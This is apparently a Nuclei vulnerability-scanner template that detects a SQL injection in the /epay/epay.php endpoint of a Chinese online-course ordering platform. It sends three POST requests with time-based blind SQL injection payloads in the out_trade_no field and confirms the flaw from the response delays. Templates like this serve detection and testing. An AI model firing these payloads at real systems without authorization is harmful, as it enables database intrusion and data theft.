id: wangke-epay-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 29网课交单平台 /epay/epay.php接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
  reference:
    - https://github.com/wy876/POC/blob/main/29%E7%BD%91%E8%AF%BE%E4%BA%A4%E5%8D%95%E5%B9%B3%E5%8F%B0epay.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /epay/epay.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        Content-Length: 79

        out_trade_no='+AND+(SELECT+8078+FROM+(SELECT(SLEEP(3)))eEcA)+AND+'aEmC'%3d'aEmC
      - |-
        POST /epay/epay.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        Content-Length: 79

        out_trade_no='+AND+(SELECT+8078+FROM+(SELECT(SLEEP(6)))eEcA)+AND+'aEmC'%3d'aEmC
      - |-
        POST /epay/epay.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        Content-Length: 79

        out_trade_no='+AND+(SELECT+8078+FROM+(SELECT(SLEEP(9)))eEcA)+AND+'aEmC'%3d'aEmC
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"